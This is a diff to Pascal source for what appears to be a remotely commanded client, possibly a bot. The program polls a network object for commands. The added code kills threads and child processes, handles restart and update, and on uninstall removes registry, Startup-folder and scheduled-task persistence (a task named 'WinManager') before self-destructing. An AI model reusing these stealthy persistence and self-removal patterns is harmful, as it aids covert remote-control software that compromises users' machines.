@@ -41,6 +41,8 @@ Begin
   Repeat
     try
     Net.GetCommands;
+    //Only count consecutive exceptions, so...
+    ExceptionCount:=0;
     Writeln('Commands = ', Net.CommandCount);
     For J:=1 to Net.CommandCount do Begin
       CmdID:=Net.GetCommandID(J);
@@ -77,11 +79,27 @@ Begin
       end;
     end;
   until Not(AllowExecution);
-  For J:=1 to High(Workers) do
+  //Forcefully terminate the other threads
+  Writeln('Terminating worker threads...');
+  For J:=0 to High(Workers) do
   if Assigned(Workers[J]) then Begin
-    Workers[J].Destroy;
+    TerminateThread(Workers[J].Handle, 0);
   end;
   SetLength(Workers, 0);
   Net.Free;
+  //Terminate child processes
+  Writeln('Terminating child processes...');
+  For J:=0 to _C-1 do
+    TerminateProcessByID(ChildProc[J]);
+  SetLength(ChildProc, 0);
+  Writeln('Done.');
+  if IsRestarting then Restart(FullName) else
+  if IsUpdating then Restart(FullName, True) else
+  if IsUninstalling then Begin
+    Reg_RemoveFromStartup;
+    DeleteTask('WinManager');
+    ChDel(StartupFolder+'\'+InternalName);
+    Selfdestruct;
+  end;
   CloseHandle(Mutex);
 end.
